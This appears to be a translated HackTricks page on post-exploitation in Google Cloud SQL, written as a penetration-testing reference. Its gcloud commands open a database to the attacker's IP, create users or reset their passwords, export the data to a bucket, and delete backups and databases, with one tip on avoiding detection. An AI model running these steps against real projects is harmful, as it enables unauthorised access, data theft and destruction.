# GCP - Cloud SQL Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Cloud SQL

Для отримання додаткової інформації про Cloud SQL див.:

{{#ref}}
../gcp-services/gcp-cloud-sql-enum.md
{{#endref}}

### `cloudsql.instances.update`, ( `cloudsql.instances.get`)

Щоб підключитися до баз даних, вам **just need access to the database port** і потрібно знати **username** та **password** — немає жодних вимог щодо IAM. Отже, простий спосіб отримати доступ, якщо база має публічну IP-адресу, — оновити allowed networks і **allow your own IP address to access it**.

<details>

<summary>Додати свій IP і підключитися до бази даних</summary>
```bash
# Use --assign-ip to make the database get a public IPv4
gcloud sql instances patch $INSTANCE_NAME \
--authorized-networks "$(curl ifconfig.me)" \
--assign-ip \
--quiet

mysql -h <ip_db> # If mysql

# With cloudsql.instances.get you can use gcloud directly
gcloud sql connect mysql --user=root --quiet
```
</details>

Також можливо використовувати **`--no-backup`** щоб **порушити резервні копії** бази даних.

Оскільки це вимоги, я не зовсім впевнений, для чого потрібні дозволи **`cloudsql.instances.connect`** та **`cloudsql.instances.login`**. Якщо ви знаєте — надішліть PR!

### `cloudsql.users.list`

Отримати **список усіх користувачів** бази даних:

<details>

<summary>Перелік користувачів бази даних</summary>
```bash
gcloud sql users list --instance <intance-name>
```
</details>

### `cloudsql.users.create`

Цей дозвіл дозволяє **створити нового користувача у базі даних**:

<details>

<summary>Створити користувача бази даних</summary>
```bash
gcloud sql users create <username> --instance <instance-name> --password <password>
```
</details>

### `cloudsql.users.update`

Цей дозвіл дозволяє **оновлювати користувача в базі даних**. Наприклад, ви можете змінити його пароль:

<details>

<summary>Змінити пароль користувача</summary>
```bash
gcloud sql users set-password <username> --instance <instance-name> --password <password>
```
</details>

### `cloudsql.instances.restoreBackup`, `cloudsql.backupRuns.get`

Резервні копії можуть містити **стару конфіденційну інформацію**, тому їх варто перевірити.\
**Відновити резервну копію** всередині бази даних:

<details>

<summary>Відновити резервну копію бази даних</summary>
```bash
gcloud sql backups restore <backup-id> --restore-instance <instance-id>
```
</details>

Щоб зробити це більш непомітно, рекомендується створити новий SQL instance і відновити дані там, замість у поточних запущених базах даних.

### `cloudsql.backupRuns.delete`

Цей дозвіл дозволяє видаляти резервні копії:

<details>

<summary>Видалити резервну копію</summary>
```bash
gcloud sql backups delete <backup-id> --instance <instance-id>
```
</details>

### `cloudsql.instances.export`, `storage.objects.create`

**Експортувати базу даних** у Cloud Storage Bucket, щоб ви могли отримати до неї доступ звідти:

<details>

<summary>Експорт бази даних у bucket</summary>
```bash
# Export sql format, it could also be csv and bak
gcloud sql export sql <instance-id> <gs://bucketName/fileName> --database <db>
```
</details>

### `cloudsql.instances.import`, `storage.objects.get`

**Імпорт бази даних** (перезаписати) з Cloud Storage Bucket:

<details>

<summary>Імпорт бази даних з Cloud Storage Bucket</summary>
```bash
# Import format SQL, you could also import formats bak and csv
gcloud sql import sql <instance-id> <gs://bucketName/fileName>
```
</details>

### `cloudsql.databases.delete`

Видалити базу даних з екземпляра БД:

<details>

<summary>Видалити базу даних</summary>
```bash
gcloud sql databases delete <db-name> --instance <instance-id>
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
